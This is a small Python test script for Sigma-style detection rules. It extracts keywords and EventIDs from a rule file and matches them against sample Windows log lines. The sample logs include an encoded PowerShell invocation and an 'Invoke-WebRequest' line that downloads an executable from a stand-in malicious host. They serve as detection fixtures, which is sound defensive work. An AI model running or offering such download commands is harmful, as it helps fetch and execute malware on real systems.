def test_rule(rule: str, logs: list):
    results = []
    keywords = []
    for line in rule.split("\n"):
        line = line.strip()
        if "contains" in line:
            if "[" in line and "]" in line:
                for kw in line.split("[")[1].split("]")[0].replace('"','').replace("'","").split(","):
                    keywords.append(kw.strip())
            else:
                kw = line.split(":")[1].strip()
                keywords.append(kw)
        if "EventID" in line:
            keywords.append(line.split(":")[1].strip())
    for log in logs:
        if any(kw in log for kw in keywords):
            results.append(log)
    return results
if __name__ == "__main__":
    logs = [
        "powershell.exe -enc SGVsbG8=",
        "cmd.exe /c dir",
        "4625 User failed login",
        "4720 New admin account created",
        "Invoke-WebRequest http://malware.com/file.exe",
        "7045 New suspicious service installed"
    ]
    sample_rule = open("examples/sigma_example.yaml").read()
    matches = test_rule(sample_rule, logs)
    print("Matches:", matches)